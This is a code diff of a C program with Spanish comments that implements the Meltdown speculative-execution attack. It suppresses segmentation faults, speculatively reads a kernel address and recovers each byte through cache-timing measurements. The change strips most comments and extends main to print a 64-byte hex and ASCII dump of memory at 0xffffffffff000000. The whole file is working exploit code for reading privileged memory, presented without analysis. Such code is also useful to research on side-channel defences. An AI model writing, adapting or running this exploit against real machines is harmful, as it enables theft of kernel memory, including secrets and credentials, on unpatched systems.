@@ -6,25 +6,24 @@
 #include <x86intrin.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include <ctype.h>
 
 #define CACHE_HIT 80  
+#define DUMP_SIZE 64  // Número de bytes a leer
 
 static sigjmp_buf bufaux;
 static char probe_array[256 * 4096];
 
-// Manager para SIGSEGV
 void segfault_handler(int sig) {
     siglongjmp(bufaux, 1);
 }
 
-// Flush de la cache
 void flush_probe_array() {
     for (int i = 0; i < 256; i++) {
         _mm_clflush(&probe_array[i * 4096]);
     }
 }
 
-// Mide el tiempo de acceso a una dirección
 int measure_access_time(int index) {
     uint64_t start, end;
     volatile uint8_t *addr = &probe_array[index * 4096];
@@ -37,7 +36,7 @@ int measure_access_time(int index) {
 }
 
 uint8_t meltdown(uint8_t *target_addr) {
-    signal(SIGSEGV, segfault_handler);  // Activamos el manager para SIGSEV
+    signal(SIGSEGV, segfault_handler);
 
     while (1) {
         flush_probe_array();
@@ -45,10 +44,9 @@ uint8_t meltdown(uint8_t *target_addr) {
 
         if (sigsetjmp(bufaux, 1) == 0) {
             uint8_t value = *target_addr;
-            probe_array[value * 4096] += 1; // acceso especulativo
+            probe_array[value * 4096] += 1;
         }
 
-        // Medimos los tiempos para ver qué índice ha sido cacheado
         for (int i = 0; i < 256; i++) {
             int time = measure_access_time(i);
             if (time < CACHE_HIT) {
@@ -58,12 +56,33 @@ uint8_t meltdown(uint8_t *target_addr) {
     }
 }
 
-int main() {
-    // Cambia esto por alguna dirección prohibida (requiere ejecución con privilegios o kernel vulnerable)
-    uint8_t *kernel_addr = (uint8_t*)0xffffffffff000000;
+void hexdump(uint8_t *base_addr, size_t num_bytes) {
+    for (size_t i = 0; i < num_bytes; i += 16) {
+        printf("%08lx  ", (unsigned long)(base_addr + i));
 
-    uint8_t secreto = meltdown(kernel_addr);
-    printf("Valor encontrado: 0x%02x (%c)\n", secreto, secreto);
+        // Imprimir hex
+        for (int j = 0; j < 16; j++) {
+            uint8_t val = meltdown(base_addr + i + j);
+            printf("%02x ", val);
+        }
+
+        printf(" ");
+
+        // Imprimir ASCII
+        for (int j = 0; j < 16; j++) {
+            uint8_t val = meltdown(base_addr + i + j);
+            printf("%c", isprint(val) ? val : '.');
+        }
+
+        printf("\n");
+    }
+}
+
+int main() {
+    uint8_t *target_addr = (uint8_t*)0xffffffffff000000;  // Ajusta según tu entorno
+
+    printf("Meltdown hexdump de 64 bytes desde %p:\n\n", target_addr);
+    hexdump(target_addr, DUMP_SIZE);
 
     return 0;
 }
